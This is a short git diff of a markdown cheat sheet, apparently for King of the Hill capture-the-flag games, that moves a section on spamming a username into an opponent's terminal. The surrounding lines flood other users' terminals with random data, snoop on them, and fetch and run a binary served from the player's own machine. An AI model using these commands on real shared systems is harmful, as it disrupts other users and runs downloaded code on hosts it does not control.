@@ -58,6 +58,10 @@ cat /dev/urandom >/dev/pts/#
 ```
 script -f /dev/pts/#
 ```
+### Spam your username to opponent shell
+```
+while true; do echo 'Your_Username' >/dev/pts/#; done 
+```
 ### Using nyancat
 Downloading nyancat to local Machine
 ```
@@ -71,8 +75,4 @@ python3 -m http.server 8080        //on your local machine start a python server
 wget http://yourip:port/nyancat   //on the KOTH_machine
 chmod +x nyancat
 ./nyancat > /dev/pts/#
-```
-### Spam your username to opponent shell
-```
-while true; do echo 'Your_Username' >/dev/pts/#; done 
 ```
